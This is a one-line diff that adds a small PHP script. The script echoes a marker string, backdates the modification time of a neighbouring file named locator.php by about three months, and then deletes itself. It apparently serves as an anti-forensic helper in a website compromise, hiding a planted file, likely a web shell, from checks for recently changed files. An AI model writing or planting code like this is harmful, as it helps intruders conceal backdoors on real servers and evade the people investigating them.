@@ -1,0 +1,1 @@
+<?php echo "rxUQDaqxMU"; if (file_exists("./locator.php")){ touch("./locator.php",(time()-60*60*24*30*3)); } unlink(__FILE__); /*73K565h5awcKDew1mT9d*/ ?>
